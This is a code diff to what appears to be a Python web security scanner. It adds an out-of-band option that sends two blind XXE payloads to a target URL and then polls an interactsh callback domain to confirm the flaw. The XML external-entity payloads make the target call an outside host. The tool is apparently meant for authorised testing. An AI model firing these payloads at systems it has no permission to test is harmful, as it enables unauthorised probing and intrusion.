@@ -19,6 +19,7 @@ async def path_test(
     method: str = "GET",
     headers: str = "",
     waf_evasion: bool = False,
+    oob: bool = False,
 ) -> dict[str, Any]:
     """Test for path traversal, XXE, open redirect, and host header injection.
 
@@ -29,6 +30,7 @@ async def path_test(
         method: HTTP method (GET or POST).
         headers: Optional JSON string of HTTP headers for authenticated testing.
         waf_evasion: Enable WAF bypass encoding for payloads.
+        oob: Enable Out-of-Band detection for blind XXE via interactsh.
     """
     start = time.monotonic()
     check_set = {c.strip().lower() for c in checks.split(",")}
@@ -87,6 +89,60 @@ async def path_test(
             results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
         except Exception as exc:
             results["host_header"] = {"error": str(exc)}
+
+    # OOB blind XXE: inject XXE payloads with OOB callback domain
+    if oob and "xxe" in check_set:
+        try:
+            import asyncio
+
+            from numasec.tools.oob_tool import python_oob_poll, python_oob_setup
+
+            setup_raw = await python_oob_setup()
+            setup_data = json.loads(setup_raw) if isinstance(setup_raw, str) else setup_raw
+            if setup_data.get("status") == "registered":
+                oob_domain = setup_data["domain"]
+                oob_cid = setup_data["correlation_id"]
+
+                # Inject blind XXE payloads
+                import httpx
+                from numasec.core.http import create_client
+
+                xxe_payloads = [
+                    f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://xxe.{oob_domain}/">]><r>&xxe;</r>',
+                    f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://xxe.{oob_domain}/xxe">%d;]><r/>',
+                ]
+                async with create_client(timeout=10, headers=extra_headers or None) as client:
+                    for payload in xxe_payloads:
+                        try:
+                            await client.post(
+                                url,
+                                content=payload,
+                                headers={"Content-Type": "application/xml"},
+                            )
+                        except httpx.HTTPError:
+                            pass
+
+                await asyncio.sleep(3)
+                poll_raw = await python_oob_poll(correlation_id=oob_cid)
+                poll_data = json.loads(poll_raw) if isinstance(poll_raw, str) else poll_raw
+
+                interactions = poll_data.get("interactions", [])
+                if interactions:
+                    results["oob_xxe"] = {"blind_xxe_confirmed": True, "interactions": interactions}
+                    results["vulnerabilities"].append({
+                        "type": "blind_xxe",
+                        "severity": "high",
+                        "confidence": 0.95,
+                        "evidence": (
+                            f"Blind XXE confirmed via OOB callback: "
+                            f"{interactions[0].get('protocol', 'unknown')} from "
+                            f"{interactions[0].get('remote_address', 'unknown')}"
+                        ),
+                        "parameter": "",
+                        "payload": f"XXE with OOB domain: {oob_domain}",
+                    })
+        except Exception as exc:
+            results["oob_xxe"] = {"error": str(exc)}
 
     total = len(results["vulnerabilities"])
     results["summary"] = f"{total} path/redirect {'vulnerability' if total == 1 else 'vulnerabilities'} found"
